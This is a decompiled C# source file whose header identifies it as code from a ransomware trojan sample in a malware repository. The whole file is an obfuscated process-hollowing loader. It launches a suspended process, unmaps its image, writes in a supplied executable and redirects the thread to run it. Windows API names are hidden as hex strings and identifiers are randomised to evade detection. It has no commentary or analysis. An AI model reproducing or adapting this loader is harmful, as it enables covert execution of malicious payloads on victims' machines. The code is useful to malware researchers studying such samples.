// Decompiled with JetBrains decompiler
// Type: ihnJiSFftJkwOJDnTenHoeEHgqjCYHTfbSohbv.nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA
// Assembly: win7, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: 672316BE-B17E-4EA9-86AE-FE3C511026A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00012-msil\Trojan-Ransom.Win32.Blocker.jewk-963a2c69846ddbf70c86298da5f8f03d47bb5737d1581721f05527c3cfe0c2d5.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ihnJiSFftJkwOJDnTenHoeEHgqjCYHTfbSohbv
{
  public sealed class nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA : cdwiwaguDrqjUYokeHVkiQDwmNHAPMGvGekbtfI
  {
    private const int CONTEXT_X86 = 65536;
    private const int CONTEXT86_INTEGER = 65538;
    private const string KERNEL32HEX = "0x6b65726e656c3332";
    private const long MEM_COMMIT = 4096;
    private const long MEM_RESERVE = 8192;
    private const string NTDLLHEX = "0x6e74646c6c";
    private const long PAGE_EXECUTE = 16;
    private const long PAGE_EXECUTE_READ = 32;
    private const long PAGE_EXECUTE_READWRITE = 64;
    private const long PAGE_NOACCESS = 1;
    private const uint PAGE_READONLY = 2;
    private const long PAGE_READWRITE = 4;

    private long bedot(long characteristics) => Conversions.ToLong(new object[8]
    {
      (object) 1L,
      (object) 16L,
      (object) 2,
      (object) 32L,
      (object) 4L,
      (object) 64L,
      (object) 4L,
      (object) 64L
    }[(int) this.RShift(characteristics, 29L)]);

    public bool DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(
      byte[] JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO,
      string SqZWmShVGiBmjUkKeHwGbICIQOjTpheGHJL)
    {
      long num1 = 0;
      uint num2 = 0;
      IntPtr zero = IntPtr.Zero;
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo pvjnddujckeOjksMpkWbgUpqo = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ flfgArtXdibxZouaq = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl tgnxuoHeDxwKarHl = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW = new nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB();
      GCHandle gcHandle = GCHandle.Alloc((object) JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, GCHandleType.Pinned);
      int int32 = gcHandle.AddrOfPinnedObject().ToInt32();
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo structure1 = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), pvjnddujckeOjksMpkWbgUpqo.GetType());
      gcHandle.Free();
      if (!((nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CreateProcessA) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CreateProcessA)))((string) null, SqZWmShVGiBmjUkKeHwGbICIQOjTpheGHJL, ref XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX, ref TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW, false, 4U, zero, (string) null, ref oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb, out NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ))
        return false;
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ structure2 = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ) Marshal.PtrToStructure(new IntPtr(int32 + structure1.e_lfanew), flfgArtXdibxZouaq.GetType());
      oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb.cb = Strings.Len((object) oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb);
      wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.ContextFlags = 65538U;
      if (structure2.Signature != 17744U | structure1.e_magic != (ushort) 23117)
        return false;
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.GetThreadContext getThreadContext = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.GetThreadContext) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.GetThreadContext));
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Re re = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Re) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Re));
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ZwUnmapViewOfSection unmapViewOfSection = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ZwUnmapViewOfSection) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ZwUnmapViewOfSection));
      IntPtr lpbuffer = (IntPtr) num1;
      int kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg = 0;
      long num3 = (long) lpbuffer;
      if (!(getThreadContext(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread, ref wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic) & re(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (int) ((long) wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Ebx + 8L), ref lpbuffer, 4, ref kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg) >= 0 & unmapViewOfSection(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) num3) >= 0L))
        return false;
      uint lpBaseAddress = (uint) (int) ((nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.VirtualAllocEx) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.VirtualAllocEx)))(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) (long) structure2.OptionalHeader.ImageBase, structure2.OptionalHeader.SizeOfImage, 12288U, 4U);
      if (lpBaseAddress == 0U)
        return false;
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr wr1 = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr));
      int lpNumberOfBytesWritten = (int) num2;
      int num4 = wr1(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) (long) lpBaseAddress, JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, (int) structure2.OptionalHeader.SizeOfHeaders, out lpNumberOfBytesWritten) ? 1 : 0;
      uint num5 = (uint) lpNumberOfBytesWritten;
      long num6 = (long) (structure1.e_lfanew + 248);
      int num7 = (int) structure2.FileHeader.NumberOfSections - 1;
      for (int index1 = 0; index1 <= num7; ++index1)
      {
        lpbuffer = new IntPtr((long) int32 + num6 + (long) (index1 * 40));
        tgnxuoHeDxwKarHl = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl) Marshal.PtrToStructure(lpbuffer, tgnxuoHeDxwKarHl.GetType());
        byte[] ICtdwlIBlQYTnnIiNroHWXNVNOkTpWvqKEMZ = new byte[(int) tgnxuoHeDxwKarHl.SizeOfRawData + 1];
        int num8 = (int) ((long) tgnxuoHeDxwKarHl.SizeOfRawData - 1L);
        for (int index2 = 0; index2 <= num8; ++index2)
          ICtdwlIBlQYTnnIiNroHWXNVNOkTpWvqKEMZ[index2] = JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO[(int) tgnxuoHeDxwKarHl.PointerToRawData + index2];
        nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr wr2 = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr));
        nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.VirtualProtectEx virtualProtectEx = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.VirtualProtectEx) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.VirtualProtectEx));
        lpNumberOfBytesWritten = (int) num5;
        int num9 = wr2(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) (long) (lpBaseAddress + tgnxuoHeDxwKarHl.VirtualAddress), ICtdwlIBlQYTnnIiNroHWXNVNOkTpWvqKEMZ, (int) tgnxuoHeDxwKarHl.SizeOfRawData, out lpNumberOfBytesWritten) ? 1 : 0;
        num5 = (uint) lpNumberOfBytesWritten;
        int num10 = virtualProtectEx(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) (long) (lpBaseAddress + tgnxuoHeDxwKarHl.VirtualAddress), (UIntPtr) tgnxuoHeDxwKarHl.Misc.VirtualSize, (UIntPtr) (ulong) this.bedot((long) tgnxuoHeDxwKarHl.Characteristics), (uint) num3);
      }
      byte[] bytes = BitConverter.GetBytes(lpBaseAddress);
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr wr3 = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Wr));
      lpNumberOfBytesWritten = (int) num5;
      int num11 = wr3(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr) ((long) wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Ebx + 8L), bytes, 4, out lpNumberOfBytesWritten) ? 1 : 0;
      wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Eax = lpBaseAddress + structure2.OptionalHeader.AddressOfEntryPoint;
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.SetThreadContext setThreadContext = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.SetThreadContext) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.SetThreadContext));
      nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ResumeThread resumeThread = (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ResumeThread) this.VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x526573756d65546872656164", typeof (nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.ResumeThread));
      return setThreadContext(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread, ref wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic) && resumeThread(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread) > 0U;
    }

    public bool DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(
      string LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo,
      string CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK)
    {
      bool flag = false;
      return File.Exists(LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo) ? this.DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(File.ReadAllBytes(LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo), CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK) : flag;
    }

    private long RShift(
      long KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ,
      long FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl)
    {
      return (long) Math.Round(this.vbLongToULong(KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ) / Math.Pow(2.0, (double) FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl));
    }

    private double vbLongToULong(long fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo) => fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo < 0L ? (double) (fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo + 4294967296L) : (double) fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo;

    private struct CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK
    {
      public uint ContextFlags;
      public uint Dr0;
      public uint Dr1;
      public uint Dr2;
      public uint Dr3;
      public uint Dr6;
      public uint Dr7;
      public nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.FLOATING_SAVE_AREA FloatSave;
      public uint SegGs;
      public uint SegFs;
      public uint SegEs;
      public uint SegDs;
      public uint Edi;
      public uint Esi;
      public uint Ebx;
      public uint Edx;
      public uint Ecx;
      public uint Eax;
      public uint Ebp;
      public uint Eip;
      public uint SegCs;
      public uint EFlags;
      public uint Esp;
      public uint SegSs;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] ExtendedRegisters;
    }

    private delegate bool CreateProcessA(
      string lpApplicationName,
      string lpCommandLine,
      ref nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX,
      ref nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW,
      bool bInheritHandles,
      uint dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      [In] ref nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb,
      out nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ);

    private struct FLOATING_SAVE_AREA
    {
      public uint ControlWord;
      public uint StatusWord;
      public uint TagWord;
      public uint ErrorOffset;
      public uint ErrorSelector;
      public uint DataOffset;
      public uint DataSelector;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint Cr0NpxState;
    }

    private delegate bool GetThreadContext(
      IntPtr hThread,
      ref nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic);

    private struct IMAGE_DATA_DIRECTORY
    {
      public uint VirtualAddress;
      public uint Size;
    }

    private struct LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo
    {
      public ushort e_magic;
      public ushort e_cblp;
      public ushort e_cp;
      public ushort e_crlc;
      public ushort e_cparhdr;
      public ushort e_minalloc;
      public ushort e_maxalloc;
      public ushort e_ss;
      public ushort e_sp;
      public ushort e_csum;
      public ushort e_ip;
      public ushort e_cs;
      public ushort e_lfarlc;
      public ushort e_ovno;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] e_res1;
      public ushort e_oemid;
      public ushort e_oeminfo;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] e_res2;
      public int e_lfanew;
    }

    private struct IMAGE_FILE_HEADER
    {
      public ushort Machine;
      public ushort NumberOfSections;
      public uint TimeDateStamp;
      public uint PointerToSymbolTable;
      public uint NumberOfSymbols;
      public ushort SizeOfOptionalHeader;
      public ushort Characteristics;
    }

    private struct KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ
    {
      public uint Signature;
      public nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.IMAGE_FILE_HEADER FileHeader;
      public nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    private struct IMAGE_OPTIONAL_HEADER32
    {
      public ushort Magic;
      public byte MajorLinkerVersion;
      public byte MinorLinkerVersion;
      public uint SizeOfCode;
      public uint SizeOfInitializedData;
      public uint SizeOfUninitializedData;
      public uint AddressOfEntryPoint;
      public uint BaseOfCode;
      public uint BaseOfData;
      public uint ImageBase;
      public uint SectionAlignment;
      public uint FileAlignment;
      public ushort MajorOperatingSystemVersion;
      public ushort MinorOperatingSystemVersion;
      public ushort MajorImageVersion;
      public ushort MinorImageVersion;
      public ushort MajorSubsystemVersion;
      public ushort MinorSubsystemVersion;
      public uint Win32VersionValue;
      public uint SizeOfImage;
      public uint SizeOfHeaders;
      public uint CheckSum;
      public ushort Subsystem;
      public ushort DllCharacteristics;
      public uint SizeOfStackReserve;
      public uint SizeOfStackCommit;
      public uint SizeOfHeapReserve;
      public uint SizeOfHeapCommit;
      public uint LoaderFlags;
      public uint NumberOfRvaAndSizes;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    private struct FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl
    {
      public byte Name;
      public nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.Misc Misc;
      public uint VirtualAddress;
      public uint SizeOfRawData;
      public uint PointerToRawData;
      public uint PointerToRelocations;
      public uint PointerToLinenumbers;
      public ushort NumberOfRelocations;
      public ushort NumberOfLinenumbers;
      public uint Characteristics;
    }

    private enum ImageSignatureTypes
    {
      IMAGE_OS2_SIGNATURE_LE = 17740, // 0x0000454C
      IMAGE_VXD_SIGNATURE = 17740, // 0x0000454C
      IMAGE_OS2_SIGNATURE = 17742, // 0x0000454E
      IMAGE_NT_SIGNATURE = 17744, // 0x00004550
      IMAGE_DOS_SIGNATURE = 23117, // 0x00005A4D
    }

    private struct Misc
    {
      public uint PhysicalAddress;
      public uint VirtualSize;
    }

    private struct fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    private delegate int Re(
      IntPtr hProcess,
      int lpBaseAddress,
      ref IntPtr lpbuffer,
      int size,
      ref int kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg);

    private delegate uint ResumeThread(IntPtr hThread);

    private struct JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB
    {
      public int nLength;
      public IntPtr lpSecurityDescriptor;
      public int bInheritHandle;
    }

    private delegate bool SetThreadContext(
      IntPtr hThread,
      ref nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA.CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj
    {
      public int cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public int dwX;
      public int dwY;
      public int dwXSize;
      public int dwYSize;
      public int dwXCountChars;
      public int dwYCountChars;
      public int dwFillAttribute;
      public int dwFlags;
      public short wShowWindow;
      public short cbReserved2;
      public int lpReserved2;
      public int hStdInput;
      public int hStdOutput;
      public int hStdError;
    }

    private delegate IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    private delegate int VirtualProtectEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      UIntPtr dwSize,
      UIntPtr flNewProtect,
      [Out] uint lpflOldProtect);

    private delegate bool Wr(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] ICtdwlIBlQYTnnIiNroHWXNVNOkTpWvqKEMZ,
      int iSize,
      out int lpNumberOfBytesWritten);

    private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);
  }
}
